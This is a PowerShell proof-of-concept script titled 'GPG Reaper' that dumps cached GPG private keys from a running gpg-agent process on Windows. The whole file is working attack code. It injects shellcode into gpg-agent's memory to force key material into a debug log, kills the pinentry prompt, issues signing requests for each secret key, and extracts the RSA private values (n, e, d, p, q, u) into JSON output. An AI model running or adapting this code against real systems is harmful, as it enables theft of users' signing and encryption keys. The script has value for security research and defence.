# GPG Reaper
# 
# MIT License
#
# Copyright (c) 2018 Kacper Szurek
# https://security.szurek.pl/
<#
.SYNOPSIS
Obtain/Steal/Restore GPG Private Key from gpg-agent cache
.DESCRIPTION
This POC demonstrates method for obtaining GPG private keys from `gpg-agent` memory under Windows.
.PARAMETER GpgConnectAgentPath
Path to gpg-connect-agent.exe
.PARAMETER GpgAgentPath
Path to gpg-agent.exe
.PARAMETER GpgPath
Path to gpg.exe
.PARAMETER OutputFile
Write output to file
.PARAMETER Verbose
Print debug information
.EXAMPLE
Gpg-Reaper
Use default GPG paths, print output to stdout, verbose
.EXAMPLE
Gpg-Reaper -Verbose $false -$OutputFile out.txt
Use default GPG paths, print output to out.txt file, no verbose
.EXAMPLE
Gpg-Reaper -GpgConnectAgentPath c:\gpg\gpg-connect-agent.exe
Custom GPG Connect Agent path
.LINK
https://security.szurek.pl/
#>
param(
    [string] $GpgConnectAgentPath="c:\Program Files (x86)\GnuPG\bin\gpg-connect-agent.exe",
    [string] $GpgAgentPath="c:\Program Files (x86)\GnuPG\bin\gpg-agent.exe",
    [string] $GpgPath="c:\Program Files (x86)\GnuPG\bin\gpg.exe",
    [string] $OutputFile,
    [bool] $Verbose=$true
)

Add-Type '
using System;
using System.Runtime.InteropServices;
public struct Win32
{ 
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess (int access, bool inheritHandler, uint processId);

    [DllImport("Kernel32.dll")]
    public static extern bool ReadProcessMemory (IntPtr process, IntPtr address, [In, Out] byte[] buffer, uint size, out uint read);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory (IntPtr process, IntPtr address, byte[] buffer, uint size, out uint written);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx (IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
}'

# Print debug message if $Verbose=$true
function Local:Print-Debug($Message) {
    if ($Verbose -eq $true) {
        Write-Output $Message
    }
}

# Convert $Address to LittleEndian
function Local:ConvertTo-LittleEndian($Address)
{
    $Address = [Int32] $Address
    $littleEndianByteArray = New-Object Byte[](0)
    $Address.ToString("X8") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
    [System.Array]::Reverse($littleEndianByteArray)    
    return $littleEndianByteArray
}

# Calculate relative offset when jump/call from $from to $to
function Local:Calc-Relative($From, $To) {
    return $To - $From - 5
}

# Read bytes from specific $Address
function Local:Read-OldBytes($Handle, $Address, $HowManyBytes) {
    $ptr = New-Object byte[] $HowManyBytes
    $size = New-Object UInt32
    [void][Win32]::ReadProcessMemory($Handle, $Address, $ptr, $ptr.length, [ref] $size)
    return $ptr
}

# Restore bytes readed from Read-OldBytes
function Local:Restore-OldBytes($Handle, $Address, $Bytes) {
    $size = New-Object UInt32
    [void][Win32]::WriteProcessMemory($Handle, $Address, $Bytes, $Bytes.length, [ref] $size)
}

# Set $file under process $handle
function Local:Set-LogFile($Handle, $LogPath, $LogSetFileRva, $JmpAddr)
{
    $size = New-Object UInt32

    $allocatedMemory = [IntPtr][Win32]::VirtualAllocEx($Handle, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
    Print-Debug ("[*] Allocate memory at: {0:x}" -f $allocatedMemory.ToInt32())

    $data1 = [system.Text.Encoding]::UTF8.GetBytes($LogPath)

    # null byte, push $LogPath
    $data1 += [Byte[]](0x00, 0x68)
    $data1 += ConvertTo-LittleEndian $allocatedMemory
    # call log_set_file
    $data1 += [Byte[]](0xE8)     
    $data1 += ConvertTo-LittleEndian ( Calc-Relative ($allocatedMemory+$data1.length-1) $LogSetFileRva  )
    # add esp, 4
    $data1 += [Byte[]](0x83, 0xc4, 0x04)
    # jmp $JmpAddr
    $data1 += [Byte[]](0xE9)
    $data1 += ConvertTo-LittleEndian ( Calc-Relative ($allocatedMemory+$data1.length-1) ($JmpAddr+5))

    [void][Win32]::WriteProcessMemory($Handle, $allocatedMemory, $data1, $data1.length, [ref] $size)

    # jmp $allocatedMemory
    $data2 = [Byte[]](0xe9)
    $data2 += ConvertTo-LittleEndian ( Calc-Relative $JmpAddr ($allocatedMemory + $LogPath.length + 1))
    # nop, nop, nop, jnz to jmp
    $data2 += [Byte[]]( 0x90, 0x90, 0x90, 0xe9)

    [void][Win32]::WriteProcessMemory($Handle, $JmpAddr, $data2, $data2.length, [ref] $size)
}

# make housekeeping function do nothing
function Local:Set-Housekeeping($Handle, $Rva) {
    $size = New-Object UInt32
    # retn
    $data += [Byte[]](0xC3)
    [void][Win32]::WriteProcessMemory($Handle, $Rva, $data, $data.length, [ref] $size)   
}

# start $process using $arguments and return its output
function Local:Start-ProcessWithArguments($Process, $Arguments)
{
    $psi = New-Object System.Diagnostics.ProcessStartInfo;
    $psi.FileName = $Process
    $psi.Arguments = $Arguments
    $psi.UseShellExecute = $false;
    $psi.RedirectStandardOutput = $true
    $p = [System.Diagnostics.Process]::Start($psi);
    return $p.StandardOutput.ReadToEnd();
}

# Send PKSIGN command with $Keygrip using Assuan Protocal using gpg connect agent
function Local:SignGpg($Keygrip)
{
    $psi = New-Object System.Diagnostics.ProcessStartInfo;
    $psi.FileName = $GpgConnectAgentPath
    $psi.UseShellExecute = $false;
    $psi.RedirectStandardInput = $true; 
    $psi.RedirectStandardOutput = $true
    $p = [System.Diagnostics.Process]::Start($psi);
    $p.StandardInput.WriteLine("SIGKEY "+$Keygrip)
    $p.StandardInput.WriteLine("SETHASH 10 7bfa95a688924c47c7d22381f20cc926f524beacb13f84e203d4bd8cb6ba2fce81c57a5f059bf3d509926487bde925b3bcee0635e4f7baeba054e5dba696b2bf")
    $p.StandardInput.WriteLine("PKSIGN")
    $p.StandardInput.Flush()
    # We need close input so read can read output
    $p.StandardInput.Close()
    return $p.StandardOutput.ReadToEnd();
}

if (-not [System.IO.File]::Exists($GpgConnectAgentPath)) {
    Print-Debug "[-] GPG connect agent $GpgConnectAgentPath not exist"
    return
}

if (-not [System.IO.File]::Exists($GpgAgentPath)) {
    Print-Debug "[-] GPG agent $GpgAgentPath not exist"
    return
}

if (-not [System.IO.File]::Exists($GpgPath)) {
    Print-Debug [-] "GPG $GpgPath not exist"
    return
}

$process = [diagnostics.process]::GetProcessesByName("gpg-agent")

if (-not $process) {
    Print-Debug "[-] No gpg-agent running"
    return
}

# Check if we support this version
$gpgAgentHash = Get-FileHash -Path $GpgAgentPath -Algorithm SHA256

if ($gpgAgentHash.Hash -eq "D1B331229966F1DCD00988BDE45E6496D447ECBF90AE35046859A67D5B55665A") {
    $logSetFileRva = 0x00431580
    $jmpAddr = 0x00418D72
    $housekeepingRva = 0x00414160
    Print-Debug "[+] Detect GPG version 3.0.3"
}
elseif ($gpgAgentHash.Hash -eq "3FDF8E4509DEEA66646F98C4A23AA7C4E0C124997BD2C66E706E4A969DDA18A8") {
    $logSetFileRva = 0x00431580
    $jmpAddr = 0x00418D72
    $housekeepingRva = 0x00414160
    Print-Debug "[+] Detect GPG version 3.0.2"
}
elseif ($gpgAgentHash.Hash -eq "BE46382E6BCBF5B358B9D01C5435C326325DB5968955B7A6EC0055607DA51CEE") {
    $logSetFileRva = 0x00431530
    $jmpAddr = 0x00418D22
    $housekeepingRva = 0x00414110
    Print-Debug "[+] Detect GPG version 3.0.1"
}
elseif ($gpgAgentHash.Hash -eq "C9F4248E1D2B1B88C5037608BB56217703573A243B793C3D9FE76F1A652324FC") {
    $logSetFileRva = 0x00430590
    $jmpAddr = 0x004183B7
    $housekeepingRva = 0x00413D60
    Print-Debug "[+] Detect GPG version 3.0.0"
}
else {
    Print-Debug ("[-] Unknown gpg-agent version, sha256: {0}" -f $gpgAgentHash.Hash)
    return
}

$output = @()

# Open process so we can allocate memory there and write to it
$handle = [Win32]::OpenProcess(0x438, $True, [Uint32]$process[0].Id)
if ($handle -eq 0) {
    Print-Debug ("[-] Cannot open process {0}" -f $process[0].Id)
    return
}

# When there is no cached credentials, pinentry process is started
# We monitor this and kill in in background job
$killLoop = {
    while (1) {
        $process = [diagnostics.process]::GetProcessesByName("pinentry")
        if ($process) {
            $process.Kill()
            $process.WaitForExit()
        }
        Sleep -Milliseconds 100
    }
}

$jmpOldBytes = Read-OldBytes $handle $jmpAddr 9
Print-Debug ("[*] Readed jmp bytes: {0}" -f [System.BitConverter]::ToString($jmpOldBytes))

$housekeepingOldBytes = Read-OldBytes $handle $housekeepingRva 1
Print-Debug ("[*] Readed housekeeping bytes: {0}" -f [System.BitConverter]::ToString($housekeepingOldBytes))

$killJob = Start-Job -ScriptBlock $killLoop

Set-Housekeeping $handle $housekeepingRva

Try {
    # Read list of private keys stored on this computer
    $keysLines = Start-ProcessWithArguments $GpgPath "--list-secret-keys --with-keygrip"
    $keysLines = $keysLines.Split([Environment]::NewLine)

    For ($i=0; $i -lt $keysLines.Count; ++$i) {
        $keyLine = $keysLines[$i]
        if ($keyLine.StartsWith("sec")) {
            Print-Debug "[+] Find sec key"
            $keyFingerprint = $keysLines[$i+2].Trim()
            $keyGripLine = $keysLines[$i+4].Trim()
            $uidLine = $keysLines[$i+6].Trim()
        } else {
            continue
        }

        if ($keyGripLine.StartsWith("Keygrip =")) {
            Print-Debug "[+] Check key grip: $keyGrip"
            Print-Debug "[*] $uidLine"
            $keyGrip = $keyGripLine.SubString(10, 40)
            # Try export public key
            $keyPub = Start-ProcessWithArguments $GpgPath "--armor --export $keyFingerprint"
            if ($keyPub.StartsWith("-----BEGIN")) {
                Print-Debug "[+] Found public key"
                # Random file so we can run this script multiple times
                $random = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                $logPath = "$env:TEMP\gpg_" + $keyGrip + "_" + $random + ".txt"

                Set-LogFile $handle $logPath $logSetFileRva $jmpAddr
                $signReturn = SignGpg $keyGrip

                # When pinentry is killed gpgagent return error
                if ($signReturn.Contains("ERR ")) {
                    Print-Debug "[-] No cached key"
                }
                # Check if output log is created successfully
                elseif ([System.IO.File]::Exists($logPath)) {
                    Print-Debug "[+] Read debug log $logPath"   
                    $content = Get-Content $logPath | Out-String
                    if ($content.Contains(" DBG: hash: (data")) {
                        # Get key private values from log file
                        $m = [regex]::Match($content, '(?s)\(n\s#([0-9A-Z]+)#\).*?\(e #([0-9A-Z]+)#\).*?\(d\s#([0-9A-Z]+)#\).*?\(p\s#([0-9A-Z]+)#\).*?\(q\s#([0-9A-Z]+)#\).*?\(u\s#([0-9A-Z]+)#\)')
                        if ($m.captures.groups.length -gt 0) {
                            $gpgN = $m.captures.groups[1].value
                            $gpgE = $m.captures.groups[2].value
                            $gpgD = $m.captures.groups[3].value
                            $gpgP = $m.captures.groups[4].value
                            $gpgQ = $m.captures.groups[5].value
                            $gpgU = $m.captures.groups[6].value
                        
                            $output += @{'n'=$gpgN;'e'=$gpgE;'d'=$gpgD;'p'=$gpgP;'q'=$gpgQ;'u'=$gpgU;'public'=$keyPub}
                            Print-Debug "[+] Key dumped"
                        }
                    }   
                } else {
                    Print-Debug "[-] No debug log"   
                }
            }
        } 
    }
} Finally {
    if ($Verbose -eq $true) {
        Write-Host "[*] Kill background Job"
    }
    Remove-Job -Force $killJob

    if ($Verbose -eq $true) {
        Write-Host "[*] Restore bytes"
    }
    Restore-OldBytes $handle $jmpAddr $jmpOldBytes
    Restore-OldBytes $handle $housekeepingRva $housekeepingOldBytes
}

if ($output.length -gt 0) {
    $out = "--START_GPG_REAPER--`n" + ($output | ConvertTo-Json -Compress) + "`n--END_GPG_REAPER--"

    if ($OutputFile) {
        $out | Out-File $OutputFile
    } else {
        Write-Output $out    
    }
}